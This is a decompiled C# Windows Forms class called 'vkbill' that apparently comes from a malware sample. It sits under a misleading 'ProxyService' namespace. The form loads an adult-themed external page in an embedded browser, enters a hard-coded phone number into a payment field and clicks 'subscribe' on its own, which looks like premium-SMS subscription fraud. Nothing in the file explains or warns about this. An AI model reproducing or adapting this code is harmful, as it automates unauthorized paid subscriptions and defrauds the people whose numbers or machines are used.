using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace ProxyService;

public class vkbill : Form
{
	public string phone = "";

	public int stage;

	private IContainer components;

	private WebBrowser wb;

	public vkbill()
	{
		InitializeComponent();
	}

	private void vkbill_Load(object sender, EventArgs e)
	{
	}

	private void wb_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		HtmlElement elementById = wb.get_Document().GetElementById("getphone");
		elementById.InvokeMember("click");
		elementById = wb.get_Document().GetElementById("pay_phone");
		elementById.set_InnerText("79258931605");
		elementById = wb.get_Document().GetElementById("subscribe");
		elementById.InvokeMember("click");
	}

	public void Do(string aphone)
	{
		phone = aphone;
		wb.Navigate("http://2o11.org/ero29/?rid=76777&c=10");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		wb = new WebBrowser();
		((Control)this).SuspendLayout();
		((Control)wb).set_Dock((DockStyle)5);
		((Control)wb).set_Location(new Point(0, 0));
		((Control)wb).set_MinimumSize(new Size(20, 20));
		((Control)wb).set_Name("wb");
		((Control)wb).set_Size(new Size(292, 273));
		((Control)wb).set_TabIndex(0);
		wb.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(wb_DocumentCompleted));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 273));
		((Control)this).get_Controls().Add((Control)(object)wb);
		((Control)this).set_Name("vkbill");
		((Control)this).set_Text("vkbill");
		((Form)this).add_Load((EventHandler)vkbill_Load);
		((Control)this).ResumeLayout(false);
	}
}
